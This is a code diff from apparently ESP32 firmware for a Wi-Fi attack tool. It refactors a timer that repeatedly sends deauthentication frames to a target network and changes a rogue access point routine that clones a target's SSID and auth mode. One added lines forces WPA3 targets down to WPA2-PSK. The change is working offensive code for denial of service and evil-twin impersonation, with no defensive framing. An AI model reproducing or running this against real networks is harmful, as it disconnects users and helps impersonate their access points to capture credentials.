@@ -30,17 +30,17 @@ static esp_timer_handle_t deauth_timer_handle;
  * @param arg expects wifi_ap_record_t
  */
 static void timer_send_deauth_frame(void *arg) {
-  wsl_bypasser_send_deauth_frame((wifi_ap_record_t *)arg);
+  wsl_bypasser_send_deauth_frame((const attack_dos_config_t *)arg);
 }
 
 /**
  * @details Starts periodic timer for sending deauthentication frame via
  * timer_send_deauth_frame().
  */
-void attack_method_broadcast(const wifi_ap_record_t *ap_record,
+void attack_method_broadcast(const attack_dos_config_t *attack_config,
                              unsigned period_sec) {
   const esp_timer_create_args_t deauth_timer_args = {
-      .callback = &timer_send_deauth_frame, .arg = (void *)ap_record};
+      .callback = &timer_send_deauth_frame, .arg = (void *)attack_config};
   ESP_ERROR_CHECK(esp_timer_create(&deauth_timer_args, &deauth_timer_handle));
   ESP_ERROR_CHECK(
       esp_timer_start_periodic(deauth_timer_handle, period_sec * 1000000));
@@ -75,10 +75,11 @@ void attack_method_rogueap(const wifi_ap_record_t *ap_record) {
              .authmode = ap_record->authmode,
              .max_connection = 1},
   };
+  if (ap_config.ap.authmode == WIFI_AUTH_WPA2_WPA3_PSK ||
+      ap_config.ap.authmode == WIFI_AUTH_WPA3_PSK) {
+    ap_config.ap.authmode = WIFI_AUTH_WPA2_PSK;
+  }
   memcpy(ap_config.ap.ssid, ap_record->ssid, 32);
   memcpy(ap_config.ap.password, password, sizeof(password));
   wifictl_ap_start(&ap_config);
-  for (uint8_t i = 0; i < sizeof(password) / sizeof(uint8_t); i++) {
-    printf("%X", password[i]);
-  }
 }
